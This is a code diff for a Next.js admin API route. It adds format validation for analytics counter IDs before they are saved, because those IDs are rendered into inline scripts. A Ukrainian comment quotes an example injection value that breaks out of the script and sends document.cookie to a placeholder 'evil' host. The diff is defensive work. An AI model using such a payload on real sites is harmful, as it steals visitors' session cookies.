@@ -7,7 +7,7 @@ import { revalidateTag } from "next/cache";
 import { getCurrentAdmin } from "@/lib/auth/admin";
 import { getSupabaseServerClient } from "@/lib/supabase/server";
 import { SETTINGS_TAG } from "@/lib/settings/get";
-import { COUNTER_KEYS } from "@/lib/analytics/ids";
+import { COUNTER_KEYS, isValidCounterId } from "@/lib/analytics/ids";
 import { CONTACT_KEYS } from "@/lib/contact/get";
 import { HOME_KEY_VALUES } from "@/lib/homepage/keys";
 import type { SupabaseClient } from "@supabase/supabase-js";
@@ -49,6 +49,28 @@ export async function POST(request: Request) {
 
   const d = db();
   if (!d) return NextResponse.json({ error: "DB unavailable" }, { status: 500 });
+
+  // ID лічильників їдуть у ТІЛО inline-<script> на кожній сторінці, тобто стають кодом.
+  // Значення на кшталт `X');fetch('https://evil/'+document.cookie;//` перетворило б сайт на
+  // скімер для всіх відвідувачів. Тому формат перевіряємо ДО запису (другий рубіж —
+  // на рендері, sanitizeAnalyticsIds в AnalyticsProvider).
+  const counterKind = new Map<string, keyof typeof COUNTER_KEYS>(
+    (Object.entries(COUNTER_KEYS) as [keyof typeof COUNTER_KEYS, string][]).map(([k, v]) => [v, k]),
+  );
+  const badCounters: string[] = [];
+  for (const [key, raw] of Object.entries(parsed.data.settings)) {
+    const kind = counterKind.get(key);
+    if (kind && !isValidCounterId(kind, raw)) badCounters.push(key);
+  }
+  if (badCounters.length > 0) {
+    return NextResponse.json(
+      {
+        error: "Invalid counter id",
+        message: `Невірний формат ID: ${badCounters.join(", ")}. Очікується GTM-XXXXXXX, G-XXXXXXX, AW-000000000 або числовий Pixel ID.`,
+      },
+      { status: 400 },
+    );
+  }
 
   const now = new Date().toISOString();
   for (const [key, raw] of Object.entries(parsed.data.settings)) {
